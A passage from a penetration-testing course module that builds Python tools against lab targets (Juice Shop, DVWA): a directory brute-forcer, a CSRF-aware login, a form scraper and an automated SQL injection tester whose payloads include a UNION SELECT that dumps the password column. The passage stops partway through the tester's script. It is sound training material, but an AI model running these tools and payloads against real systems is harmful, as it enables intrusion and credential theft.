# Module 3: Web Application Assessment
### Building a Directory Brute-Forcer, Web Scraper, Sub-Domain Enumerator, and Automated Form Exploiter with `requests` and `BeautifulSoup`

---

## Module Overview

Modules 1 and 2 worked below the application layer — raw sockets and raw packets, the plumbing underneath everything. Module 3 moves up to where most real-world bugs actually live: **the web application itself**. Instead of "is this door open," we're now asking "what's hiding behind this website that its owners didn't intend to expose," and "can I trick this website's own logic into doing something it shouldn't."

Two FOSS libraries carry this entire module:

- **`requests`** — a clean HTTP client. If `socket` was writing a raw letter by hand, `requests` is a full postal courier service: it handles headers, cookies, redirects, and encoding for you, while still letting you inspect and control everything.
- **`BeautifulSoup`** — an HTML parser. Web pages are technically just long strings of text, but `BeautifulSoup` turns that "soup" of tags into a structured object you can search — like turning an unsorted pile of receipts into a searchable spreadsheet.

We use **two lab targets** in this module, deliberately chosen to teach two very different realities of the modern web:

| Target | Address | Why We Use It |
|---|---|---|
| **OWASP Juice Shop** | `http://192.168.56.1:3000` | A modern JavaScript Single Page Application (SPA) — teaches you why naive directory brute-forcing breaks on modern web apps |
| **DVWA (Damn Vulnerable Web App), bundled in Metasploitable2** | `http://192.168.56.101/dvwa` | A classic server-rendered PHP app with real HTML forms — teaches session/cookie handling, CSRF tokens, and classic SQLi/XSS |

We build in these increments:

1. HTTP request/response anatomy (foundation)
2. Session & cookie management with CSRF token handling (DVWA login)
3. Directory/file brute-forcer with soft-404 detection (Juice Shop)
4. HTML scraper and form discovery (DVWA)
5. Sub-domain enumerator (safe, lab-local technique)
6. Automated SQL injection payload tester (DVWA)
7. Automated XSS payload tester (DVWA)
8. Final combined CLI recon tool

> ⚠️ **Every script in this module touches live web application logic — logins, databases, form submissions.** This is qualitatively more invasive than port scanning. Confirm both targets are listed in your `ROE.md` before running anything below, and never point these scripts at a domain you don't own.

---

## Step 1: HTTP Request/Response Anatomy

### The Target
`scripts/module3/http_anatomy.py` — send a basic HTTP request and dissect every part of the reply.

### The Concept
Think of an HTTP request like ordering at a restaurant counter. You state what you want (the **method** and **path** — "GET /menu"), you might hand over a loyalty card (a **cookie**), and you speak in a certain accent that identifies who you are (**headers**, like `User-Agent`). The kitchen sends back your food (the **body**) along with a receipt stapled to it (**status code** and **response headers**) telling you whether the order succeeded (`200 OK`), doesn't exist (`404 Not Found`), or the kitchen caught fire (`500 Internal Server Error`). Every tool in this entire module is just increasingly clever variations of "place an order and read the receipt."

### The Implementation

```bash
mkdir -p pentest-lab/scripts/module3
```

**`scripts/module3/http_anatomy.py`**
```python
"""
http_anatomy.py
Sends a single HTTP GET request and dissects every part of the
request/response cycle. This is the foundation every later script
in this module builds on.
"""

import sys

import requests

TARGET_URL = "http://192.168.56.1:3000"   # OWASP Juice Shop, per ROE.md
REQUEST_TIMEOUT_SECONDS = 5


def inspect_request_response(url: str, timeout: float) -> None:
    """Sends a GET request and prints a full breakdown of both sides."""
    # A custom User-Agent identifies our tool honestly in server logs —
    # some servers also behave differently (or block) default Python
    # User-Agents, so setting our own is good practice from the start.
    custom_headers = {"User-Agent": "PyPentestCourse-Module3/1.0"}

    try:
        response = requests.get(url, headers=custom_headers, timeout=timeout)
    except requests.exceptions.ConnectionError:
        print(f"[FAIL] Could not connect to {url}. Is the target running?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print(f"[FAIL] Request to {url} timed out after {timeout}s.")
        sys.exit(1)
    except requests.exceptions.RequestException as err:
        # Catch-all for anything else requests can raise (malformed URL, etc.)
        print(f"[FAIL] Unexpected request error: {err}")
        sys.exit(1)

    print("=" * 60)
    print("REQUEST SENT")
    print("=" * 60)
    print(f"Method:  {response.request.method}")
    print(f"URL:     {response.request.url}")
    print("Headers WE sent:")
    for key, value in response.request.headers.items():
        print(f"  {key}: {value}")

    print("\n" + "=" * 60)
    print("RESPONSE RECEIVED")
    print("=" * 60)
    print(f"Status code:     {response.status_code} ({response.reason})")
    print(f"Elapsed time:    {response.elapsed.total_seconds():.3f}s")
    print(f"Content length:  {len(response.content)} bytes")
    print("Headers THEY sent:")
    for key, value in response.headers.items():
        print(f"  {key}: {value}")

    # Cookies are a special sub-part of headers (Set-Cookie), but requests
    # parses them into their own convenient jar object
    if response.cookies:
        print("\nCookies set by server:")
        for cookie in response.cookies:
            print(f"  {cookie.name} = {cookie.value}")
    else:
        print("\nNo cookies set on this request.")

    print(f"\nFirst 200 characters of body:\n{response.text[:200]!r}")


if __name__ == "__main__":
    inspect_request_response(TARGET_URL, REQUEST_TIMEOUT_SECONDS)
```

### The Verification

```bash
cd pentest-lab
source .venv/bin/activate
python3 scripts/module3/http_anatomy.py
```

**Expected output (abbreviated):**
```
============================================================
REQUEST SENT
============================================================
Method:  GET
URL:     http://192.168.56.1:3000/
Headers WE sent:
  User-Agent: PyPentestCourse-Module3/1.0
  Accept-Encoding: gzip, deflate
  Accept: */*
  Connection: keep-alive

============================================================
RESPONSE RECEIVED
============================================================
Status code:     200 (OK)
Elapsed time:    0.045s
Content length:  3821 bytes
Headers THEY sent:
  X-Powered-By: Express
  Content-Type: text/html; charset=UTF-8
  ...

No cookies set on this request.

First 200 characters of body:
'<!DOCTYPE html><html><head><base href="/"><meta charset="utf-8">...'
```

Notice **no cookies were set** on a plain root request — that changes the moment we log into something in Step 2, which is exactly why session handling deserves its own dedicated step.

---

## Step 2: Session Management, Cookies, and CSRF Tokens

### The Target
`scripts/module3/dvwa_session.py` — log into DVWA programmatically, correctly handling its session cookie and CSRF token, and set its security level.

### The Concept
A **cookie** is like a wristband stamped at the entrance of a theme park — every ride you visit afterward checks that wristband instead of asking you to prove your ticket again. `requests.Session()` is our own wrist automatically re-showing that wristband on every subsequent request, so we don't have to manually track and re-attach it ourselves.

A **CSRF token** ("Cross-Site Request Forgery" token) is a *different* thing that trips up nearly everyone the first time they automate a login: it's a one-time claim ticket embedded invisibly in the login page's HTML, and the server refuses to accept your login `POST` unless you send back the *exact* token it just handed you moments earlier. This exists to stop a malicious website from silently submitting forms to DVWA on a logged-in victim's behalf. For us, it means: **we must first `GET` the login page, scrape the token out of its HTML with BeautifulSoup, and then include it in our login `POST`** — you cannot skip straight to submitting credentials.

### The Implementation

**`scripts/module3/dvwa_session.py`**
```python
"""
dvwa_session.py
Logs into DVWA using a requests.Session (for automatic cookie
persistence) and BeautifulSoup (to scrape the CSRF token required
by the login form). Also sets DVWA's security level to 'low',
which later steps (SQLi/XSS) depend on.
"""

import sys

import requests
from bs4 import BeautifulSoup

DVWA_BASE_URL = "http://192.168.56.101/dvwa"   # Metasploitable2, per ROE.md
DVWA_USERNAME = "admin"
DVWA_PASSWORD = "password"   # Default, intentionally-weak DVWA credentials
REQUEST_TIMEOUT_SECONDS = 5


def extract_csrf_token(html: str, field_name: str = "user_token") -> str:
    """
    Parses an HTML page for a hidden input field containing a CSRF
    token. Raises a clear error if the field isn't found, instead of
    letting a later step fail with a confusing, unrelated error.
    """
    soup = BeautifulSoup(html, "html.parser")
    # DVWA's token lives in <input type="hidden" name="user_token" value="...">
    token_input = soup.find("input", {"name": field_name})

    if token_input is None or not token_input.get("value"):
        raise ValueError(
            f"Could not find CSRF token field '{field_name}' on the page. "
            "The page structure may have changed, or the session may already "
            "be logged in (no login form present)."
        )
    return token_input["value"]


def login_to_dvwa(session: requests.Session) -> None:
    """
    Performs the full DVWA login flow:
    1. GET the login page to receive a fresh session cookie + CSRF token
    2. POST credentials + that token
    3. Verify login succeeded by checking for a known post-login marker
    """
    login_url = f"{DVWA_BASE_URL}/login.php"

    try:
        login_page = session.get(login_url, timeout=REQUEST_TIMEOUT_SECONDS)
        login_page.raise_for_status()
    except requests.exceptions.RequestException as err:
        print(f"[FAIL] Could not reach DVWA login page: {err}")
        sys.exit(1)

    csrf_token = extract_csrf_token(login_page.text)
    print(f"[OK] Extracted CSRF token: {csrf_token[:16]}...")

    login_payload = {
        "username": DVWA_USERNAME,
        "password": DVWA_PASSWORD,
        "user_token": csrf_token,
        "Login": "Login",
    }

    try:
        # The session object automatically carries forward the cookie
        # it received from the GET above — we never touch cookies manually
        login_response = session.post(login_url, data=login_payload,
                                       timeout=REQUEST_TIMEOUT_SECONDS)
        login_response.raise_for_status()
    except requests.exceptions.RequestException as err:
        print(f"[FAIL] Login POST request failed: {err}")
        sys.exit(1)

    # A successful DVWA login redirects to index.php, which contains a
    # "Logout" link. Its absence means the login silently failed —
    # DVWA doesn't return a distinct HTTP error code for bad credentials.
    if "Logout" not in login_response.text:
        print("[FAIL] Login appears to have failed — 'Logout' link not found. "
              "Check credentials or DVWA state.")
        sys.exit(1)

    print("[OK] Logged into DVWA successfully.")


def set_security_level(session: requests.Session, level: str = "low") -> None:
    """
    DVWA has a configurable 'security level' (impossible/high/medium/low)
    that changes how vulnerable each page is. Steps 6 and 7 assume 'low'.
    This also requires its own CSRF token, fetched the same way as login.
    """
    security_url = f"{DVWA_BASE_URL}/security.php"

    try:
        security_page = session.get(security_url, timeout=REQUEST_TIMEOUT_SECONDS)
        security_page.raise_for_status()
    except requests.exceptions.RequestException as err:
        print(f"[FAIL] Could not reach DVWA security page: {err}")
        sys.exit(1)

    csrf_token = extract_csrf_token(security_page.text)

    security_payload = {
        "security": level,
        "seclev_submit": "Submit",
        "user_token": csrf_token,
    }

    try:
        response = session.post(security_url, data=security_payload,
                                 timeout=REQUEST_TIMEOUT_SECONDS)
        response.raise_for_status()
    except requests.exceptions.RequestException as err:
        print(f"[FAIL] Could not set security level: {err}")
        sys.exit(1)

    print(f"[OK] Security level set to '{level}'.")


def create_authenticated_dvwa_session() -> requests.Session:
    """
    Public entry point used by later scripts (Steps 6 and 7 import this
    directly, rather than duplicating login logic).
    """
    session = requests.Session()
    login_to_dvwa(session)
    set_security_level(session, "low")
    return session


if __name__ == "__main__":
    print("Establishing authenticated DVWA session...\n")
    dvwa_session = create_authenticated_dvwa_session()

    # Prove the session actually carries our cookie forward by
    # requesting a page that requires login, without logging in again
    check_response = dvwa_session.get(f"{DVWA_BASE_URL}/index.php",
                                       timeout=REQUEST_TIMEOUT_SECONDS)
    if "Logout" in check_response.text:
        print("\n[OK] Session persisted correctly — still logged in on a fresh request.")
```

### The Verification

```bash
python3 scripts/module3/dvwa_session.py
```

**Expected output:**
```
Establishing authenticated DVWA session...

[OK] Extracted CSRF token: 4f9c1a8b2e3d7f01...
[OK] Logged into DVWA successfully.
[OK] Security level set to 'low'.

[OK] Session persisted correctly — still logged in on a fresh request.
```

To *prove* the CSRF requirement is real (not just theoretical), temporarily edit the script to submit `login_payload` **without** the `user_token` key entirely, and rerun — you should see DVWA's login silently fail (`[FAIL] Login appears to have failed`), confirming the server actively rejects submissions missing a valid token. Restore the `user_token` field before continuing — Steps 6 and 7 both import `create_authenticated_dvwa_session()` directly from this file.

---

## Step 3: Directory & File Brute-Forcer

### The Target
`scripts/module3/dir_bruteforce.py` — discover hidden files and paths on Juice Shop by testing a wordlist of common names, with **soft-404 detection**.

### The Concept
This is the web equivalent of Module 1's port scanner — instead of trying 1,024 door numbers, we try a list of common filenames and folder names (`admin`, `backup`, `.env`, `robots.txt`) and see what responds.

Here's the trip-up almost everyone hits on their first attempt at this: **classic web apps return a real `404 Not Found` for missing pages, but modern JavaScript Single Page Applications (SPAs) like Juice Shop often return `200 OK` for *everything*** — including paths that don't really exist — because the server just hands back the same generic app shell and lets JavaScript in the browser decide what to display. If you only check `if status_code == 200`, every single guess will look like a "hit," which is worse than useless. The fix is a **baseline comparison**: first request a path we're certain doesn't exist (a random, absurd string), record its response length, and then treat any *real* guess that comes back with that exact same length as a false positive — not a genuine discovery.

### The Implementation

**`pentest-lab/wordlists/common_paths.txt`**
```text
robots.txt
sitemap.xml
.well-known/security.txt
ftp
assets
api
rest
socket.io
administration
metrics
encryptionkeys
.git/HEAD
.env
backup
config.json
package.json
main.js
vendor
swagger.json
```

**`scripts/module3/dir_bruteforce.py`**
```python
"""
dir_bruteforce.py
Discovers hidden files/paths via wordlist brute-forcing, with
baseline-response comparison to filter out soft-404 false positives
common on modern SPAs.
"""

import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

TARGET_BASE_URL = "http://192.168.56.1:3000"   # OWASP Juice Shop, per ROE.md
WORDLIST_PATH = "wordlists/common_paths.txt"
REQUEST_TIMEOUT_SECONDS = 5
MAX_WORKER_THREADS = 20   # Gentler than Module 1's 100 — web servers are
                          # more likely to rate-limit or degrade under load


def load_wordlist(path: str) -> list[str]:
    """Reads paths from a wordlist file, skipping blank lines/comments."""
    try:
        with open(path, "r", encoding="utf-8") as file:
            return [line.strip() for line in file
                    if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found at '{path}'.")
        sys.exit(1)


def get_baseline_signature(base_url: str, session: requests.Session,
                            timeout: float) -> int:
    """
    Requests a deliberately fake, near-certainly-nonexistent path and
    records its response length. This is our 'known false 200' baseline —
    any real guess that matches this length is very likely also fake.
    """
    fake_path = f"this-path-should-not-exist-{uuid.uuid4().hex[:12]}"
    try:
        response = session.get(f"{base_url}/{fake_path}", timeout=timeout)
        return len(response.content)
    except requests.exceptions.RequestException as err:
        print(f"[WARN] Could not establish baseline: {err}")
        return -1   # Sentinel value: baseline comparison will simply never match


def check_path(base_url: str, path: str, session: requests.Session,
                timeout: float, baseline_length: int) -> dict:
    """Checks a single path and classifies it against the baseline."""
    url = f"{base_url}/{path}"
    result = {"path": path, "url": url, "status": None,
              "length": None, "verdict": "error"}

    try:
        response = session.get(url, timeout=timeout, allow_redirects=False)
        result["status"] = response.status_code
        result["length"] = len(response.content)

        if response.status_code == 404:
            result["verdict"] = "not_found"
        elif response.status_code in (301, 302, 307, 308):
            result["verdict"] = "redirect"
        elif response.status_code == 200:
            # This is the critical check the naive version of this
            # script would skip entirely
            if result["length"] == baseline_length:
                result["verdict"] = "likely_soft_404"
            else:
                result["verdict"] = "found"
        else:
            result["verdict"] = f"other ({response.status_code})"

    except requests.exceptions.Timeout:
        result["verdict"] = "timeout"
    except requests.exceptions.ConnectionError:
        result["verdict"] = "connection_error"
    except requests.exceptions.RequestException as err:
        result["verdict"] = f"error: {err}"

    return result


def run_bruteforce(base_url: str, wordlist: list[str],
                    timeout: float, max_workers: int) -> list[dict]:
    """Runs the check concurrently across the full wordlist."""
    # A single shared Session reuses the underlying TCP connection across
    # requests (HTTP keep-alive) — meaningfully faster than opening a new
    # connection per path, and it's how a real browser behaves too.
    session = requests.Session()
    session.headers.update({"User-Agent": "PyPentestCourse-Module3/1.0"})

    baseline_length = get_baseline_signature(base_url, session, timeout)
    print(f"[INFO] Baseline soft-404 response length: {baseline_length} bytes\n")

    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_path = {
            executor.submit(check_path, base_url, path, session, timeout,
                             baseline_length): path
            for path in wordlist
        }

        completed = 0
        for future in as_completed(future_to_path):
            completed += 1
            print(f"\rProgress: {completed}/{len(wordlist)}", end="", flush=True)
            try:
                results.append(future.result())
            except Exception as err:
                path = future_to_path[future]
                print(f"\n[WARN] Unexpected error checking '{path}': {err}")

    print()
    return results


if __name__ == "__main__":
    print(f"Directory/file brute-force against {TARGET_BASE_URL}\n")

    wordlist = load_wordlist(WORDLIST_PATH)
    start = time.perf_counter()
    results = run_bruteforce(TARGET_BASE_URL, wordlist,
                              REQUEST_TIMEOUT_SECONDS, MAX_WORKER_THREADS)
    elapsed = time.perf_counter() - start

    found = [r for r in results if r["verdict"] == "found"]
    soft_404s = [r for r in results if r["verdict"] == "likely_soft_404"]

    print(f"\n{'=' * 60}\nGenuine Discoveries\n{'=' * 60}")
    if found:
        for r in found:
            print(f"  [{r['status']}] {r['url']}  ({r['length']} bytes)")
    else:
        print("  None found.")

    print(f"\n[INFO] {len(soft_404s)} path(s) filtered out as soft-404 false positives.")
    print(f"[INFO] Scan completed in {elapsed:.2f} seconds.")
```

### The Verification

```bash
python3 scripts/module3/dir_bruteforce.py
```

**Expected output (Juice Shop version numbers/paths may vary slightly):**
```
Directory/file brute-force against http://192.168.56.1:3000

[INFO] Baseline soft-404 response length: 3821 bytes

Progress: 19/19

============================================================
Genuine Discoveries
============================================================
  [200] http://192.168.56.1:3000/robots.txt  (68 bytes)
  [200] http://192.168.56.1:3000/ftp  (612 bytes)
  [200] http://192.168.56.1:3000/main.js  (891204 bytes)
  [200] http://192.168.56.1:3000/api  (48 bytes)

[INFO] 15 path(s) filtered out as soft-404 false positives.
[INFO] Scan completed in 1.12 seconds.
```

**To see exactly why the baseline check matters, comment it out** (temporarily force `result["verdict"] = "found"` for every `200` regardless of length) and rerun — you'll suddenly see all 19 paths reported as "genuine discoveries," including obviously fake ones. That false-positive flood is precisely the failure mode real-world testers hit constantly against SPAs, and precisely why this baseline technique is standard practice in serious tooling (Nmap's own `http-enum` NSE script and tools like `ffuf`/`gobuster` implement similar filtering).

---

## Step 4: Web Scraping and Form Discovery

### The Target
`scripts/module3/form_scraper.py` — crawl DVWA's pages, extract every hyperlink and HTML form (including all its input fields), building a map of attack surface.

### The Concept
`BeautifulSoup` turns raw HTML text into a navigable tree structure. If a webpage is a printed page full of text, `BeautifulSoup` is a highlighter combined with a table of contents — you can ask it "find me every `<a>` tag" or "find me every `<form>` and list its input fields" without manually pattern-matching through raw text yourself (which would be fragile and error-prone). This step matters immensely before Steps 6 and 7: **you cannot intelligently attack a form's fields if you don't first know what fields exist, what they're named, and what method they submit with.**

### The Implementation

**`scripts/module3/form_scraper.py`**
```python
"""
form_scraper.py
Crawls a set of pages, extracting all links and all HTML forms
(with their input fields) using BeautifulSoup. Building block for
Steps 6 and 7, which need to know exact form field names to attack.
"""

import sys
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

from dvwa_session import create_authenticated_dvwa_session, DVWA_BASE_URL

REQUEST_TIMEOUT_SECONDS = 5

# A small, deliberately limited set of known DVWA pages — a full crawler
# that follows every link recursively risks infinite loops and is out of
# scope for this focused teaching step.
PAGES_TO_SCRAPE = [
    "vulnerabilities/sqli/",
    "vulnerabilities/xss_r/",
    "vulnerabilities/exec/",
]


def extract_links(soup: BeautifulSoup, base_url: str) -> list[str]:
    """Finds every <a href="..."> tag and resolves it to an absolute URL."""
    links = []
    for anchor in soup.find_all("a", href=True):
        # urljoin correctly handles relative paths like "../index.php"
        # or "login.php" by resolving them against the current page's URL —
        # doing this manually with string concatenation is a common source
        # of subtle bugs (double slashes, missing paths, etc.)
        absolute_url = urljoin(base_url, anchor["href"])
        links.append(absolute_url)
    return links


def extract_forms(soup: BeautifulSoup) -> list[dict]:
    """
    Finds every <form> tag and extracts its action, method, and every
    input/select/textarea field it contains, along with default values.
    """
    forms_found = []

    for form in soup.find_all("form"):
        form_info = {
            "action": form.get("action", ""),
            "method": form.get("method", "get").lower(),
            "fields": [],
        }

        # Cover all three common field-carrying tag types — a form
        # missing textarea/select fields is a very common scraping bug
        for field in form.find_all(["input", "select", "textarea"]):
            field_info = {
                "tag": field.name,
                "name": field.get("name"),
                "type": field.get("type", "text"),
                "value": field.get("value", ""),
            }
            # Fields without a 'name' attribute are never submitted by
            # browsers, so they're irrelevant to us — skip them
            if field_info["name"]:
                form_info["fields"].append(field_info)

        forms_found.append(form_info)

    return forms_found


def scrape_page(session: requests.Session, base_url: str, path: str) -> dict:
    """Fetches one page and extracts both its links and its forms."""
    url = urljoin(base_url + "/", path)
    try:
        response = session.get(url, timeout=REQUEST_TIMEOUT_SECONDS)
        response.raise_for_status()
    except requests.exceptions.RequestException as err:
        print(f"[WARN] Could not scrape {url}: {err}")
        return {"url": url, "links": [], "forms": []}

    soup = BeautifulSoup(response.text, "html.parser")
    return {
        "url": url,
        "links": extract_links(soup, url),
        "forms": extract_forms(soup),
    }


if __name__ == "__main__":
    print("Authenticating to DVWA before scraping (some pages require login)...\n")
    session = create_authenticated_dvwa_session()

    for page_path in PAGES_TO_SCRAPE:
        print(f"\n{'=' * 60}")
        result = scrape_page(session, DVWA_BASE_URL, page_path)
        print(f"Page: {result['url']}")
        print(f"{'=' * 60}")

        print(f"\nLinks found ({len(result['links'])}):")
        for link in result["links"][:10]:   # cap display for readability
            print(f"  - {link}")

        print(f"\nForms found ({len(result['forms'])}):")
        for form in result["forms"]:
            print(f"  Action: '{form['action']}'  Method: {form['method'].upper()}")
            for field in form["fields"]:
                print(f"    [{field['tag']}] name='{field['name']}' "
                      f"type='{field['type']}' value='{field['value']}'")
```

### The Verification

```bash
python3 scripts/module3/form_scraper.py
```

**Expected output (abbreviated):**
```
Authenticating to DVWA before scraping (some pages require login)...

[OK] Extracted CSRF token: ...
[OK] Logged into DVWA successfully.
[OK] Security level set to 'low'.

============================================================
Page: http://192.168.56.101/dvwa/vulnerabilities/sqli/
============================================================

Links found (14):
  - http://192.168.56.101/dvwa/index.php
  - http://192.168.56.101/dvwa/security.php
  ...

Forms found (1):
  Action: '#'  Method: GET
    [input] name='id' type='text' value=''
    [input] name='Submit' type='submit' value='Submit'
```

Confirm the form's `name='id'` field is exactly what's printed — Step 6's SQLi injector targets this **exact field name**, scraped here rather than hardcoded blindly, which is the correct habit for testing against forms you haven't seen before.

---

## Step 5: Sub-Domain Enumeration (Safe, Lab-Local Technique)

### The Target
`scripts/module3/subdomain_enum.py` — discover which sub-domains of a target domain actually resolve and respond, using a technique that's 100% safe to practice against infrastructure you fully control.

### The Concept
Sub-domain enumeration in the real world means testing whether names like `admin.example.com` or `ftp.example.com` resolve to a real server — like checking a company directory to see which department extensions are actually staffed versus disconnected. **Doing this against a real domain requires DNS infrastructure you don't have in an isolated lab** — and testing it against a domain you don't own would violate the very authorization principle this whole series is built on.

The solution: your own computer's **`/etc/hosts` file** (or `C:\Windows\System32\drivers\etc\hosts` on Windows) is checked by your operating system *before* any real DNS server, for every single hostname lookup. By adding a few fake sub-domain entries there, pointing at your own lab VM, we can practice the exact same `socket.gethostbyname()` resolution logic real sub-domain enumerators use — entirely locally, entirely safely, with zero real-world network requests.

### The Implementation

First, add lab-local DNS entries. Open your hosts file with elevated privileges:

```bash
sudo nano /etc/hosts
```

Add these lines at the bottom (leave everything else untouched):
```text
192.168.56.101   www.lab.local
192.168.56.101   ftp.lab.local
192.168.56.101   admin.lab.local
192.168.56.101   dvwa.lab.local
```
Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X` in nano). Note we've deliberately **not** added an entry for something like `mail.lab.local` — that absence is what proves our tool correctly reports non-existent sub-domains as such.

**`pentest-lab/wordlists/subdomains.txt`**
```text
www
ftp
admin
mail
dvwa
staging
dev
test
```

**`scripts/module3/subdomain_enum.py`**
```python
"""
subdomain_enum.py
Enumerates sub-domains of a target domain by attempting DNS resolution
for each candidate, then confirming with an HTTP request.

SAFE FOR LAB USE: targets 'lab.local', resolved entirely via your own
/etc/hosts file — no real DNS infrastructure is queried.
"""

import socket
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

TARGET_DOMAIN = "lab.local"
WORDLIST_PATH = "wordlists/subdomains.txt"
DNS_TIMEOUT_SECONDS = 2
HTTP_TIMEOUT_SECONDS = 3
MAX_WORKER_THREADS = 10


def load_wordlist(path: str) -> list[str]:
    try:
        with open(path, "r", encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found at '{path}'.")
        sys.exit(1)


def resolve_subdomain(subdomain: str, domain: str) -> dict:
    """
    Attempts DNS resolution for one candidate sub-domain, then confirms
    the resolved host actually serves HTTP (a domain can resolve to an
    IP while nothing listens on port 80 — resolution alone isn't proof
    of a live web service).
    """
    full_host = f"{subdomain}.{domain}"
    result = {"host": full_host, "resolved_ip": None, "http_alive": False}

    # socket.setdefaulttimeout affects gethostbyname's underlying
    # resolution attempt — without it, a hung DNS lookup could stall
    # far longer than expected
    socket.setdefaulttimeout(DNS_TIMEOUT_SECONDS)

    try:
        resolved_ip = socket.gethostbyname(full_host)
        result["resolved_ip"] = resolved_ip
    except socket.gaierror:
        # This is the expected, correct outcome for sub-domains that
        # genuinely don't exist (like 'mail.lab.local' in our setup)
        return result
    except socket.timeout:
        result["resolved_ip"] = "timeout"
        return result

    try:
        response = requests.get(f"http://{full_host}", timeout=HTTP_TIMEOUT_SECONDS)
        result["http_alive"] = response.status_code < 500
    except requests.exceptions.RequestException:
        # DNS resolved but nothing answered on HTTP — still a meaningful
        # finding, just not a "live website"
        result["http_alive"] = False

    return result


def run_enumeration(domain: str, subdomains: list[str],
                     max_workers: int) -> list[dict]:
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_sub = {
            executor.submit(resolve_subdomain, sub, domain): sub
            for sub in subdomains
        }
        for future in as_completed(future_to_sub):
            try:
                results.append(future.result())
            except Exception as err:
                sub = future_to_sub[future]
                print(f"[WARN] Unexpected error checking '{sub}': {err}")

    return sorted(results, key=lambda r: r["host"])


if __name__ == "__main__":
    print(f"Enumerating sub-domains of '{TARGET_DOMAIN}' "
          f"(resolved via local /etc/hosts — safe, no real DNS queried)\n")

    subdomains = load_wordlist(WORDLIST_PATH)
    results = run_enumeration(TARGET_DOMAIN, subdomains, MAX_WORKER_THREADS)

    resolved = [r for r in results if r["resolved_ip"] not in (None, "timeout")]

    print(f"{'Host':<25}{'Resolved IP':<20}{'HTTP Alive'}")
    print("-" * 60)
    for r in resolved:
        print(f"{r['host']:<25}{r['resolved_ip']:<20}{r['http_alive']}")

    print(f"\n[INFO] {len(resolved)}/{len(results)} candidate sub-domains resolved.")
```

### The Verification

```bash
python3 scripts/module3/subdomain_enum.py
```

**Expected output:**
```
Enumerating sub-domains of 'lab.local' (resolved via local /etc/hosts — safe, no real DNS queried)

Host                     Resolved IP         HTTP Alive
------------------------------------------------------------
admin.lab.local          192.168.56.101      True
dvwa.lab.local           192.168.56.101      True
ftp.lab.local            192.168.56.101      True
www.lab.local            192.168.56.101      True

[INFO] 4/8 candidate sub-domains resolved.
```

Notice `mail.lab.local`, `staging.lab.local`, `dev.lab.local`, and `test.lab.local` correctly do **not** appear — they weren't in your `/etc/hosts` file, exactly mirroring how real sub-domains that were never registered fail to resolve. **The exact same `socket.gethostbyname()` logic here works identically against real, authorized domains** — only the hosts file substitution makes this exercise self-contained and safe.

---

## Step 6: Automated SQL Injection Payload Tester

> ⚠️ **This step actively attempts to manipulate a database's query logic.** Run only against DVWA on your Metasploitable2 lab VM, only at security level "low" (set automatically in Step 2), and never against any application you don't own or have written authorization to test.

### The Target
`scripts/module3/sqli_tester.py` — send a list of common SQL injection payloads to DVWA's SQLi page and detect which ones succeed.

### The Concept
Think of a vulnerable form like a bank teller who reads your deposit slip aloud verbatim to a back-office clerk, word for word, including anything you write on it. **SQL injection (SQLi)** works by writing something on that "slip" that isn't a normal deposit amount, but is instead a fragment of the clerk's own instruction language — like writing "$100, and also, hand me everyone else's account balance too" and having the clerk read that entire sentence as a literal instruction because they never questioned *whether* your input was a legitimate number in the first place. The vulnerable code is doing exactly that: pasting your raw text directly into a SQL query string instead of treating it strictly as *data*.

Our detection strategy: submit a normal baseline value first (e.g., `1`), record how many results come back, then submit each payload and check whether the result set is meaningfully different (typically much larger, or contains an obvious database error message) — the same "compare against a known baseline" principle from Step 3, now applied to application logic instead of HTTP status codes.

### The Implementation

**`scripts/module3/sqli_tester.py`**
```python
"""
sqli_tester.py
Sends a curated list of classic SQL injection payloads to DVWA's SQLi
page and detects success by comparing response characteristics against
a known-safe baseline request.

FOR AUTHORIZED LAB USE ONLY — DVWA, security level 'low'.
"""

import sys

import requests

from dvwa_session import create_authenticated_dvwa_session, DVWA_BASE_URL

REQUEST_TIMEOUT_SECONDS = 5
SQLI_ENDPOINT = f"{DVWA_BASE_URL}/vulnerabilities/sqli/"

# A small, well-known set of classic payloads. Real assessments use much
# larger, more targeted lists (see this module's Appendix reference),
# but these four illustrate the core technique clearly.
SQLI_PAYLOADS = [
    "1",                                  # Baseline: a normal, expected input
    "1' OR '1'='1",                       # Classic always-true tautology
    "1' UNION SELECT user, password FROM users -- -",  # Data exfiltration attempt
    "1' AND 1=CONVERT(int, (SELECT @@version)) -- ",    # Error-based fingerprinting
]

# Substrings that strongly suggest a raw database error leaked into the
# response — a common, high-confidence signal of a genuine vulnerability
DB_ERROR_SIGNATURES = ["SQL syntax", "mysql_fetch", "You have an error in your SQL"]


def submit_payload(session: requests.Session, payload: str) -> requests.Response:
    """Submits a single payload to the DVWA SQLi form's 'id' GET parameter."""
    params = {"id": payload, "Submit": "Submit"}
    try:
        return session.get(SQLI_ENDPOINT, params=params, timeout=REQUEST_TIMEOUT_SECONDS)
    except requests.exceptions.RequestException as err:
        print(f"[WARN] Request failed for payload {payload!r}: {err}")
        return None


def analyze_response(baseline_length: int, response: requests.Response) -> str:
    """Classifies a response as likely vulnerable, likely safe, or errored."""
    if response is None:
        return "request_failed"

    body = response.text

    for signature in DB_ERROR_SIGNATURES:
        if signature.lower() in body.lower():
            return "likely_vulnerable (db error leaked)"

    # A response dramatically larger than baseline suggests extra rows
    # were returned — e.g., an entire user table dumped via UNION SELECT
    if len(body) > baseline_length * 1.5:
        return "likely_vulnerable (response size anomaly)"

    return "likely_safe"


if __name__ == "__main__":
    print("Authenticating to DVWA...\n")
    session = create_authenticated_dvwa_session()

    print(f"\nTesting SQLi payloads against {SQLI_ENDPOINT}\n")

    baseline_response = submit_payload(session, SQLI_PAYLOADS[0])
    if baseline_response is None:
        print("[FAIL] Could not establish a baseline response. Aborting.")
        sys.exit(1)
    baseline_length = len(baseline_response.text)
    print(f"[INFO] Baseline response length (id={SQLI_PAYLOADS[0]!r}): "
          f"{baseline_length} chars\n")

    for payload in SQLI_PAYLOADS[1:]:
        response = submit_payload(session, payload)
        verdict = analyze_response(baseline_length, response)
        response_length = len(response.text) if response is not None else 0
